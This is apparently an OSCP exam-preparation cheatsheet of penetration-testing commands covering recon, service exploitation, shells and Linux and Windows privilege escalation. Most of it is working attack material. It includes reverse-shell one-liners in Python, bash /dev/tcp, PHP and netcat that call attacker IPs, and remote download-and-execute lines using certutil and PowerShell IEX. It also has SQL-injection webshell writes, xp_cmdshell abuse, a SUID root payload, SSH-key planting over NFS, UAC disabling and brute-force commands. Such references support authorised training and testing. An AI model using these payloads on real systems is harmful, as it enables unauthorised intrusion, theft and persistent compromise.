# OSCP 2022 Cheatsheet


### [Initial Recon](#Initial-Recon-1)  
### [Services](#Services-1)
### [Shells](#Shells-1)
### [Linux Privilege Escalation](#Linux-Privilege-Escalation-1)
### [Windows Privilege Escalation](#Windows-Privilege-Escalation-1)
### [Firewall Disabling](#Firewall-Disabling-1)
### [Compilation](#Compilation-1)
### [MSFvenom Payload Generation](#MSFvenom-Payload-Generation-1)
### [Hash Cracking](#Hash-Cracking-1)


## Initial Recon

Network scans
```bash
# 1st round of nmap scans
$ sudo nmap -v -A [target]      # TCP default ports, OS detection, version detection, script scanning, and traceroute.
$ sudo nmap -v -p- -sT [target] # TCP all ports (TCP connect)
$ sudo nmap -v -p- -sS [target] # TCP all ports (TCP SYN only)
$ sudo nmap -v -sU [target]     # UDP default ports.

# force fast scan
$ sudo nmap -v -p- -sS -T5 [target] # TCP all ports super fast

# 2nd round of nmap scans
$ sudo nmap -p[newly_discovered_port_1,2,3] -sV -A [target]
```

Web scans - Gobuster/Nikto/Nmap
```bash
$ nikto -host [target]
$ sudo nmap -v -sV -p80,443 --script vuln [target]

$ gobuster dir -u [target] -w SecLists/Discovery/Web-Content/common.txt                   # easiest
^Alternate common wordlist /usr/share/wordlists/dirb/common.txt
$ gobuster dir -u [target] -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt # dirs small
$ gobuster dir -u [target] -w SecLists/Discovery/Web-Content/raft-small-files.txt         # files small
```

## Services

### FTP [21 TCP]

Tips
* Switch on `binary` mode before transferring files.
* Try `PUT` and `GET`.

Anonymous login
* `anonymous:[empty pass]`

Brute-force
* `hydra -L users.txt -P [passwords.txt] [target] ftp`
* Try `admin:admin` or other stupid creds.


### SSH [22 TCP]

Hydra SSH brute-force
```bash
$ hydra -L users.txt -P SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt [target] ssh -t 4
```

### SMTP [25 TCP]

Nmap vuln scan
```bash
$ sudo nmap -p25 --script smtp-vuln-* [target]
```

Mail server Shellshock RCE
* Grab SMTP service banner -> check service(s) against Shellshock vulnerability.
* Known: Postfix w/ Procmail, qmail MTA, exim MTA.
* See https://www.trendmicro.com/en_us/research/14/j/shellshock-related-attacks-continue-targets-smtp-servers.html

Manual fingerprinting
```bash
$ echo VRFY 'admin' | nc -nv -w 1 [target] 25
```

SMTP user enumeration
```bash
$ smtp-user-enum -M VRFY -U /usr/share/wordlists/dirb/common.txt -t [target]
```

### TFTP [69 UDP]

TFTP is a simple protocol for transferring files.

Pentest UDP TFTP: https://book.hacktricks.xyz/pentesting/69-udp-tftp

TFTP Nmap enum
```bash
$ nmap -sU -p69 --script tftp-enum [target]
```

TFTP commands
```bash
$ tftp
tftp> connect [target]
tftp> put [/path/to/local.txt]
tftp> get [/path/to/remote.txt]

# directory traversal
tftp> get ..\..\..\..\..\boot.ini
tftp> get \boot.ini
```


### Web [80, 8080, 443 TCP]

Tips
* ALWAYS run Nikto.
* ALWAYS run Gobuster.
* If you can't find anything from initial scans, recursively scan subdirs including those that you don't think contain anything e.g. `/icons`

Nmap script vuln scan
```bash
$ sudo nmap -v -sV -p80,443 --script vuln [target]
```

Brute-Force Logins
```bash
# generate wordlist from target website
$ cewl http://target.com
```

Filter / file extension bypass
```bash
%0d%0a
%00
%en
%00en
```

Arbitrary file disclosure / LFI / RFI
* Try all three if one works.

PHP code exec i.e. `eval()`
```bash
# Try different system command functions
system()
passthru()
exec()
shell_exec()

# Encode payload in base64 -> use base64_decode()
# You may need to URL encode base64 '=' equals to '%3d'
/index.php?b);system(base64_decode('INSERT_BASE64_ENCODED_SYSTEM_COMMAND')=/
```

SQL Injection
* See SQL injection cheatsheet: https://github.com/brianlam38/Sec-Cheatsheets/blob/master/Web/Web_Cheatsheet.md#sql-injection
1. Test single and double quotes for *500 Internal Server Error* response.
2. Manually test payloads or use Burp Intruder with SQL payloads.
3. Grab password hashes or perform code exec to obtain reverse shell.
* If authentication page is present, ALWAYS try **auth bypass payload** e.g. `' or '1'='1`
* If time-based SQLi, you could also find a script to brute-force password one-char at-a-time.

MySQL Injection -> PHP Code Execution
```sql
/* STEP 1: find the web root - C:\xampp\htdocs or /var/www/html etc. */
/* STEP 2: write PHP code into web root */
'UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:\\xampp\\htdocs\\shell.php"'
'UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php'-- -'
/* STEP 3: code exec */
$ curl -v http://[target]/shell.php?cmd=whoami
```

Apache Shellchock (/cgi-bin/*.cgi])
```bash
# Test if vulnerable
curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; echo 'VULNERABLE'" http://[target]/cgi-bin/[cgi_file]

# Reverse shell
curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.2\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://localhost:8080/cgi-bin/shellshock_test.sh
```

Apache Tomcat
* Default creds at `SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt`
* Port 8009 (AJP) open: CVE-2020-1938 "GhostCat" LFI vulnerability (restricted to paths in Tomcat root).

IIS
* IIS paths may be configured to be Case Sensitive. Take care when navigating / exploiting LFI/RFI or directory traversal.

Wordpress guide
* https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress

Wordpress wpscan
```bash
# normal scan
wpscan --url [target]/wordpress

# brute-force WP logins
wpscan --url [target]/wordpress -U admin -P [/path/to/wordlist]
```

Wordpress reverse shell (https://github.com/wetw0rk/malicious-wordpress-plugin)
```bash
# STEP 1: Create malicious plugin
$ python wordpwn.py [LHOST] [LPORT] N
$ unzip malicious.zip

# STEP 2: Replace generated base64-encoded PHP payload with
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[LHOPST]/[LPORT] 0>&1'"); ?>

# STEP 3: Navigate to [target]/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php
```

ALTERNATE Wordpress shell
```bash
$ locate plugin-shell.php
$ zip plugin-shell.zip plugin-shell.php
# WP plugins -> add new plugin -> upload zip -> activate plugin
$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
# upload netcat or reverse shell script and execute.
```


### POP3 [110 TCP]

Post Office Protocol (ver 3) is an application layer protocol used to download emails from a remote server to your local device.

Useful commands
```
$ telnet [target] 110
> USER [username]
+ OK
> PASS [pass]
+ OK
> LIST               # list all messages
> RETR [message no.] # retrieve email
```

### RPC/Portmapper [111, 135 TCP]

NFS shares
```
$ rpcinfo -p [target]                             # enum NFS shares
$ showmount -e [ target IP ]                      # show mountable directories
$ mount -t nfs [target IP]:/ /mnt -o nolock       # mount remote share to your local machine
$ df -k                                           # show mounted file systems
```

RPC client
```
$ rpcclient -U "" [target]  // null session
$ rpcclient -U "" -N [target]
rpcclient> srvinfo
rpcclient> enumdomains
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> getdompwinfo

# Follow up enum
rpcclient> querygroup 0x200
rpcclient> querygroupmem 0x200
rpcclient> queryuser 0x3601
rpcclient> getusrdompwinfo 0x3601
```

Exploit NFS shares for privesc:
```bash
$ showmount -e 192.168.xx.53
Export list for 192.168.xx.53:
/shared 192.168.xx.0/255.255.255.0
$ mkdir /tmp/mymount
/bin/mkdir: created directory '/tmp/mymount'
$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
```

```c
# generic C exploit
#include <stdio.h>
#include <unistd.h>
int main(void)
{
setuid(0);
setgid(0);
system("/bin/bash");
}
gcc exploit.c -m32 -o exploit
```

```bash
$ cp /root/Desktop/x /tmp/mymount/
$ chmod u+s exploit
```

Attack scenario: replace target SSH keys with your own
```bash
$ mkdir -p /root/.ssh
$ cd /root/.ssh/
$ ssh-keygen -t rsa -b 4096
Enter file in which to save the key (/root/.ssh/id_rsa): hacker_rsa
Enter passphrase (empty for no passphrase): Just Press Enter
Enter same passphrase again: Just Press Enter
$ mount -t nfs 192.168.1.112:/ /mnt -o nolock
$ cd /mnt/root/.ssh
$ cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/
$ cat hacker_rsa.pub >> authorized_keys                     # add your public key to authorized_keys
$ ssh -i /root/.ssh/hacker_rsa root@192.168.1.112           # SSH to target using your private key
```

### IMAP

Pentesting IMAP: https://book.hacktricks.xyz/pentesting/pentesting-imap

### Samba (LINUX SMB) [139 TCP]

Check Samba service version.
* Samba <2.2.8 versions are vulnerable to RCE.
* Samba 3.5.11/3.6.3 versions are vulnerable to RCE.


### SMB (WINDOWS SMB) [139, 445 TCP]

Enumerate SMB
* Look for exploitable services.
* Look for custom directories/files that were not discoverable via. brute-force.
```bash
$ nmblookup -A [target]
$ smbclient -L //[target]   // null session
$ enum4linux [target]       // null session
$ nbtscan [target]

$ smbclient --no-pass -L //10.11.1.31         # list shares
$ smbclient --no-pass \\\\[target]\\[share]   # connect to a share

$ smbmap -u "guest" -R [share] -H 10.11.1.31  # recursively list files in a folder
$ smbget -R smb://[target]/share                # recursively get files from target share/dir
```

Automated enum
```bash
$ python3 ~/OSCP/Tools/enum4linux-ng/enum4linux-ng.py [target] 
```

Eternal Blue (MS17-010)
```bash
# check for vuln
# source: https://github.com/worawit/MS17-010/blob/master/checker.py
$ eternalblue/checker.py [target]
OR
$ sudo nmap --script smb-vuln-* [target] # nmap

# generse rshell payload -> exec exploit
# source: https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py
$ msfvenom -p windows/shell_reverse_tcp LHOST=[kali] LPORT=666 EXITFUNC=thread -f exe -a x86 -o ms17-010.exe
$ msf17-010-send-and-receive.py [target] ms17-010.exe
```

SMB Login Brute-force (**last option**)
```
$ hydra -V -f -l [username] -P [/path/to/wordlist] smb # smb brute-force
```

### SNMP [161 UDP]

SNMP is an app-layer protocol for collecting and managing information about devices within a network.

SNMP enumeration:
(find further info about devices/software with vulns to gain a shell)
```bash
$ snmpwalk -c [community string] -v1 [ target ]
$ onesixtyone [ target ] -c community.txt
$ snmpenum
$ snmp-check [ target ]
```

Snmpwalk brute-force script:
* [Community string wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt)
```
#!/bin/bash
while read line; do
    echo "Testing $line"; snmpwalk -c $line -v1 10.10.10.105
done < community.txt
```

### IRC [194,6667,6660-7000 TCP]

IRC client
```
$ sudo apt-get install irssi
$ irssi -c [target] -p [port] -n [nickname]

!irc> /version
!irc> /list               # list channels + channel banner
!irc> /admin              # admin info
!irc> /oper [user] [pass] # login as operator (privileged user)
!irc> /join [channel]
!irc> /whois [user]       # user info

#channel> /names          # list users inside each channel
#channel> /leave          # leave channel
```

### LDAP [389,636 TCP]

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Enumerate LDAP
```
$ nmap -p389 -n -sV --script "ldap* and not brute" [target]
$ ldapsearch -x -b "dc=acme,dc=com" "*" -h [target]
```

### Java RMI (Remote Method Invocation)

Java RMI is an object-orientated RPC mechanism that allows an object in a JVM to call methods in another JVM.

```
# Enum common RMI vulnerabilities
$ rmg enum [target] [rmi_port]

# Enum RMI methods
$ rmg guess [target] [rmi_port]
[+] Listing successfully guessed methods:
[+] 	- plain-server2 == plain-server
[+] 		--> String execute(String dummy)

# Call methods enum'd above
$ rmg call [target [rmi_port] '"id"' \
    --bound-name plain-server \
    --signature "String execute(String dummy)" \
    --plugin GenericPrint.jar
[+] uid=0(root) gid=0(root) groups=0(root)
```

### Rsync [873 TCP]

Rsync is a utility for transferring and synchronizing files between computers.

Enable use of Kali SSH key to access target
* NOTE: You may need to enum creds to use the rsync service.
```bash
# add kali SSH pub key to 'authorized_keys' file
$ cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

# rysnc operations
$ rsync [target]::              # list available folders
$ rsync [target]::/[folder]     # list files in folder
$ rsync -av ~/.ssh [target]::/[folder]/.ssh # transfer authorized_key file
$ ssh -v [remote_user]@[target] # ssh as remote user using Kali SSH key
```

### MSSQL [1433 TCP]

MSSQL client
```
# Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
$ sqsh -S <IP> -U <Username> -P <Password> -D <Database>

$ sqlcmd -S [target] -U [username] -P [password]
```

MSSQL Injection
```
/login.asp?name=admin'%20or%20'1'%3d'1'--&pass=asdf # bypass login

param=';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; # enable xp_cmdshell code exec
param=';EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;           # enable xp_cmdshell code exec
param=';EXEC%20xp_cmdshell%20'ping%20192.168.119.210'--            # test code exec

param=';EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://[kali]/nc.exe'-- # upload netcat
param=';EXEC xp_cmdshell 'nc 192.168.119.210 443 -e cmd.exe'--    # initiate reverse shell connection
```

### Oracle TNS Listener (indicator of OracleDB) [1521 TCP]

OracleDB injection
```
# Current user
param='UNION SELECT user,null,null FROM dual--

# List users
param='UNION SELECT name FROM sys.user$;--
param='UNION SELECT username FROM all_users ORDER BY username;--

# Grab hashes
param='UNION SELECT name, password, astatus FROM sys.user$--
param='UNION SELECT name,spare4 FROM sys.user$--

# List all tables & owners
param='UNION SELECT DISTINCT table_name, owner FROM all_tables--

# List column names in a table
param='union SELECT column_name,null,null FROM all_tab_columns where table_name = 'TABLE_NAME'--

# Select Nth row in table
param='union SELECT col1, col2, colN FROM (SELECT ROWNUM r, col1, col2 FROM TABLE_NAME ORDER BY col1) where r=(row_number)--
```


### MySQL [3306 TCP]

[MySQL commands cheatsheet](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)

Execute commands non-interactively
* `mysql -u root -p[password] mysql -e "[mysql_command]"`
* `mysql -u root -p[password] mysql -e "SHOW VERSION();"`

Drop into shell non-interactively
* `mysql -u root -p[assword mysql -e "\! /bin/sh"`

See "Mysql UDF" in privesc section for privilege escalation techniques.

### Apache James Mail Server [4555 TCP]

Default credentials are `root` / `root`.

`Version 2.3.2` is vulnerable to [RCE - SEE HERE](https://packetstormsecurity.com/files/164313/Apache-James-Server-2.3.2-Remote-Command-Execution.html).

### PostgreSQL [5432, 5433 TCP]

Authenticated arbitrary command execution
* PostgreSQL ver 9.3 > LATEST
```sql
$ psql -h [target] -p [port] -U postgres
Password for user postgres:

postgres=# \c postgres                              # connect to postgres DB
postgres=# CREATE TABLE cmd_exec(cmd_output text);  # create table to hold cmd output
postgres=# COPY cmd_exec FROM PROGRAM ‘{command}’;  # exec command
postgres=# SELECT * FROM cmd_exec;                  # view results
postgres=# DROP TABLE IF EXISTS cmd_exec;           # cleanup
```

PostgreSQL RCE - UDF and other methods
* https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions


### VNC [5800, 5900 TCP]

Connect to VNC
```
$ vncviewer [target]::[port]
```

VNC login brute-force
```
$ hydra -s 5900 -P /usr/share/wordlists/rockyou.txt [target] vnc
```

VNC authentication bypass:
```
# First, check if VNC service is vulnerable to auth bypass:
https://github.com/curesec/tools/blob/master/vnc/vnc-authentication-bypass.py
# If vulnerable, run manual exploit:
https://github.com/arm13/exploits-1/blob/master/vncpwn.py
# If that doesn't work, try MSF module:
msf> use auxiliary/admin/vnc/realvnc_41_bypass
```

VNC password cracking:
https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/


### WinRM [5985, 5986 TCP]

WinRM is a Microsoft protocol that allows remote management of Windows machines over HTTP using SOAP.

```
$ ./evil-winrm -i [target] -u [username] -p [password]
```

## Shells

Reverse shell payloads: https://github.com/brianlam38/OSCP-2022/tree/main/Tools/shells

Tricks
* Try to URL encode payload if exploit is not working in webapp.
* Try to remove firewall rules if rshell payloads don't trigger (see below). Confirm code exec by creating `test.txt` file on target if you have a way to identify that the file was created e.g. via. `smb` or `ftp` etc.

Reverse shell local ports
* Try use open ports of the target as the receiving port, as both ingress/egress would typically be open for a service.
* E.g. if 21/FTP is open on the target, try use port 21 as the local port for a reverse shell.

Spawn TTY shell / rbash restricted shell escape
```
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
/bin/bash -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
:!bash                       # within vi
:set shell=/bin/bash:shell   # within vi

$ nmap --interactive         # within nmap
nmap> !sh                          

# REMEMBER TO DO THIS TO FIX YOUR PATHS
$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Web shell + SMB exec
```
# Setup local share e.g. python3 ../smbserver.py EVILSHARE .
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share] 

# Execute netcat reverse shell within webshell
> \\[host]\share\nc.exe [host] [port] -e cmd.exe
```

Have a web shell? Check if server can reach you
```
$ sudo tcpdump -i tun0 -n icmp -v
```

CGI / Perl Web Server
* If web server is running CGI scripts, try Perl rshell payload -> change extension to `.cgi`.

Powershell
```
# Exec local PS script
cmd> powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"

# Exec remote PS script
PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
```

Powershell locations on 64bit Windows
```
# 32bit powershell
c:\windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

# 64bit powershell
c:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe
```

PHP shells / Bypass PHP disable functions
```
<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.5/4444 0>&1'"); ?>

<?php echo shell_exec("nc [local] [port] -e cmd.exe"); ?>
```

## Linux Privilege Escalation

Tips:
* PE could rely on the same vulnerability to obtain an initial foothold.

Scripts
* [Linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

### SUDO Misconfigurations

NOPASSWD - run Sudo without a password
```bash
$ sudo -l                # confirm misconfiguration
$ sudo nmap --interative # start interactive nmap
nmap> !sh                # pop root shell
```

LD_PRELOAD


### SUID / SGID

[SUID3ENUM.py](https://github.com/Anon-Exploiter/SUID3NUM)
* Find SUID binaries -> cross-match with GTFO bins.
* Don't use `-e` flag for auto-exploitation (OSCP banned).
```
$ python suid3num.py
```

### Running services

Tips:
* Check firewall rules.
* Check for anti-virus software and see if you need to disable.

Method 1:
* Check if services running as root are writable by user.
* Overwrite binary or reference file/arg with your own payload for privesc.

Method 2:
* Check version of services running as root.
* See if vulnerable to a local privilege escalation vuln.

### Binary service versions

GTFOBins
* GTFOBins are a list of Unix binaries that can be used for privesc in misconfigured systems.
* Check your binaries against [GTFOBins list](https://gtfobins.github.io/).

Vulnerable binary versions
1. Look for binaries, especially non-standard ones.
2. Run `$ searchsploit [binary_name] [version]` and exploit.

### Docker privesc

Basic privesc example: https://flast101.github.io/docker-privesc/
More on Docker breakout & privesc: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout

Writable Docker Socket */var/run/docker.sock*: [see here](https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket)
* Detected Linpeas.sh or manually.
* Requires image -> if none, run `docker pull` to download an image to machine.
```
# CHECK IF WRITABLE
$ ls -la /var/run/docker.sock

# OPTION 1
$ docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash

# OPTION 2
$ docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

### Writable /etc/passwd

Replace root password hash
1. Kali: generate a password `openssl passwd hacker123` and obtain a password hash.
2. Target: replace root password `x` in `/etc/passwd` file with password hash i.e. `root:<has>:0:0:----`

### Writable .Service Files

Check if you can write any .service file, if you can, you could modify it so it executes your backdoor when the service is started, restarted or stopped.
```bash
# check contents of .Service file
$ cat /etc/systemd/system/app.Service
[Unit]
Description=Python App
After=network-online.target
[Service]
Type=simple
WorkingDirectory=/home/john/app
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=john
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target

# change configuration
(remote)WorkingDirectory=XXX
ExecStart=/home/john/rshell
User=root

# restart host or service
$ sudo reboot
$ service xxx restart
```



### MySQL User-Defined-Functions (UDF)

Mysql UDF privilege escalation.
* https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
* https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/

If you get the below error, simply replace `/usr/lib/mysql/plugin/raptor_udf2.so` with the `raptor_udf2.so` file you created originally.
```
mysql> create function do_system returns integer soname ’raptor_udf2.so’ ;
ERROR 1126 (HY000) : Can’t open shared library ’raptor_udf2.so’ (errno : 0 /usr/lib/mysql/plugin/raptor_udf2.so : file too short)
```

If you cannot execute commands interactively, exec interactively by:
* `mysql -u root -p[password] mysql -e "[mysql_command]"`


### NFS 'NO_ROOT_SQUASH' Misconfiguration

Exploit NFS shares for privesc.

Discover vulnerability with `cat /etc/exports` and see if a directory is configured as `NO_ROOT_SQUASH`.
* You can access it from as a client and write inside that directory as if you were the local root of the machine.
* See https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.

Mount misconfigured directory
```
$ showmount -e 192.168.xx.53
Export list for 192.168.xx.53:
/shared 192.168.xx.0/255.255.255.0
$ mkdir /tmp/mymount
/bin/mkdir: created directory '/tmp/mymount'
$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
```

Create payload
```
# generic C exploit
#include <stdio.h>
#include <unistd.h>
int main(void)
{
setuid(0);
setgid(0);
system("/bin/bash");
}
gcc exploit.c -m32 -o exploit
```

Copy payload -> set SUID bit
```
$ cp /root/Desktop/x /tmp/mymount/
$ chmod u+s exploit
```

### Git

Found references to git / git repo + a private SSH key?
```bash
# extract remote repository
$ mv /home/[user]/.ssh/id_rsa ~/.ssh/                # copy key to your .ssh dir
$ git clone file:///[repo_name]                      # git clone OPTION 1
$ git clone ssh://[user]@[target]:[port]/[repo_name] # git clone OPTION 2
```

## Windows Privilege Escalation

### Tips

Ensure architecture of your PS shell = architecture of PS payload.
* Check if PS shell is 64bit `[Environment]::Is64BitProcess`


### Automated Scripts

Scripts
* [Winpeas x86 x64](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
* [Jaws enum](https://github.com/411Hall/JAWS)

Privesc Powershell one-liners
* https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70

Powerup.ps1
```powershell
cmd> powershell -executionpolicy bypass
PS> Import-Module C:\temp\powerup.ps1
PS> Invoke-AllChecks
```

### OS Vulnerabilities

Windows Exploit Suggester
```bash
$ python3 windows_exploit_suggester.py --update
$ python3 windows_exploit_suggester.py --database 2021-10-27-mssb.xls --systeminfo systeminfo.out
```

Windows Exploit Suggester NEW
```bash
# search only privesc vulenrabilities
$ python3 windows-exploit-suggester-new/wes.py -i "Elevation of Privilege" systeminfo.txt
```

Enum missing software patches
```
# automated - sherlock.ps1
cmd> powershell -executionpolicy bypass ".\sherlock.ps1"
cmd> 

# manual - wmic
# 1. check installed KB patches
# 2. systeminfo -> search for privilege escalation vulns for the OS ver + service pack
#                  and corresponding KB patch numbers.
# 3. Use KB patch numbers and grep for the installed patches on the target.
# Win exploit / KB patch list: https://github.com/SecWiki/windows-kernel-exploits
cmd> wmic qfe get Caption,Description,HotFixID,InstalledOn

```
1. Copy local `sherlock.ps1` file to remote.
2. Run `cmd> powershell -executionpolicy bypass ".\sherlock.ps1"`.

Windows SP0/SP1 UPNPHOST/SSDPSRV privilege escalation
* See https://sohvaxus.github.io/content/winxp-sp1-privesc.html
```powershell
cmd> sc qc upnphost
cmd> sc config upnphost binpath= "C:\temp\nc.exe [kali] 666 -e cmd.exe" # set binpath to nc payload
cmd> sc config upnphost obj= ".\LocalSystem" password= ""               # load as system with no pwd
cnd> sc config upnphost depend= ""                                # remove dependnecies (SSDPSRV)
cmd> net start upnphost                                                 # start service + catch reverse shell
```

### Services - Misconfigured Permissions

Enumerate misconfigured service permissions
* Exploit by replacing binary with malicious reverse shell binary.

Find running services we can write to (weak service permissions)
```powershell
# Accesschk (fast)
cmd> accesschk.exe /accepteula -uwcqv "Authenticated Users" *
cmd> accesschk.exe /accepteula -uwdqs Users c:\

# powershell (fast)
PS> Get-Acl
PS> Get-ChildItem | Get-Acl

# tasklist (slow)
cmd> tasklist /svc
```

Exploit
```
cmd> tasklist /svc
vulnservice.exe VulnService

# enum service
cmd> vulnservice
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: MEmuSVC
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\path\to\vulnservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : VulnService
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

# check service permissions
# reference: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753525(v=ws.10)?redirectedfrom=MSDN
cmd> icacls/cacls "C:\Program Files\path\to\vulnservice.exe"
^LOOK FOR FULL (F) WRITE (W)
cmd> accesschk.exe -ucqv vulnservice -accepteula
^LOOK FOR WRITE (W)

Everyone:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(F)
CHIMERA\steph:(I)(F)

# replace service binary with malicious binary, then restart computer
cmd> rename evil.exe vulnservice.exe
cmd> move vulnservice.exe "C:\Program Files\path\to\vulnservice.exe"
cmd> shutdown /r /t 0
#OR
cmd> sc qc VulnService restart
```

### Services - Unquoted Paths

Conditions:
* Path to service is unquoted and has spaces.
* Running with LocalSystem or equivalent Administrative permissions.
* User should have write permissions to a folder in the path.
* User should have permission to start the service OR the service auto-restarts on shutdown/start-up.

Find unquoted paths with WMIC:
* Find all services with "auto" start mode (automatically starts at system start-up),
```
cmd> wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
``` 

Exploit steps:
1. Find unquoted service binpaths, for services run as ADMIN e.g. `binpath= C:\Program Files\A bad folder\adminservice.exe`.
2. Check if you have FULL/WRITE `(F)(W)` permissions along path using:

    a) `icacls "C:\Program Files\folder\A unquoted folder\adminservice.exe"` 

    b) `accesschk.exe -ucqv [/path/to/unquoted/folder] -accepteula`

3. Generate reverse shell payload and rename to path e.g. `A.exe`.
4. Place malicious binary in path, so that it is executed e.g. `move A.exe "C:\Program Files\folder"`.
5. Execute by restarting computer (if service has startmode = auto) with `shutdown /r /t 0`.

### User Account Control (UAC) Bypass

Even if you are a local admin, User Account Control (UAC) maybe turned on which may force your user to respond to **UAC credential/consent prompts** in order to perform privileged actions.
* UAC bypass walkthrough: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/

STEP 1: Check if we should perform UAC bypass
```
cmd> whoami /priv    # do we have very few privileges even as local admin?
cmd> whoami /groups  # is "Mandatgory Label\XXX Mandatory Level" set to MEDIUM?
cmd> psexec.exe -i -accepteula -d -s rshell.exe # are we getting issues running psexec as SYSTEM?

# check if UAC turned on
cmd> reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
...
EnableLUA                  REG_DWORD 0x1 # if 0x1 = UAC ENABLED
ConsentPromptBehaviorAdmin REG_DWORD 0x5 # if NOT 0x0 = consent required
PromptOnSecureDesktop      REG_DWORD 0x1 # if 0x1 = Force all credential/consent prompts
...

# try to disable UAC
cmd> reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /d 0 /t REG_DWORD
```

STEP 2: Prepare exploits
```
# modify uac-bypass.c to execute reverse shell
# compile w/ correct architecture
$ x86_64-w64-mingw32-gcc ~/OSCP-2022/Tools/privesc-windows/uac-bypass.c -o uac-bypass.exe

# generate reverse shell payload
$  msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[kali] LPORT=666 -f exe -o rshell.exe
```

STEP 3: Transfer, setup listener and exec payload
```
cmd> copy \\[kali]\[share]\uac-bypass.exe uac-bypass.exe
cmd> copy \\[kali]\[share]\rshell.exe rshell.exe
cmd> .\uac-bypass.exe
```

### File & Folder Permissions

Writable web root? Upload reverse shell -> navigate to file path
* Xampp: `C:\xampp\htdocs`
* IIS: `C:\inetpub\wwwroot` 
* etc.

### Access Token Abuse

Abuse is possible if `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled
* Walkthrough: https://www.notion.so/CHEATSHEET-ef447ed5ffb746248fec7528627c0405#5cedd479d1c1429e8018211371eec1ad
* Windows CLSIDs: http://ohpe.it/juicy-potato/CLSID/

JuicyPotato - All older versions of Windows
```
# edit nc.bat with correct params and transfer to remote host
cmd> whoami /privs
cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c

# Exploit failed - incorrect CLSID
Testing {4991D34B-80A1-4291-B697-000000000000} 443
COM -> recv failed with error: 10038

# Exploit worked - correct CLSID
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 443
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

PrintSpoofer - Windows 10 and Server 2016/2019
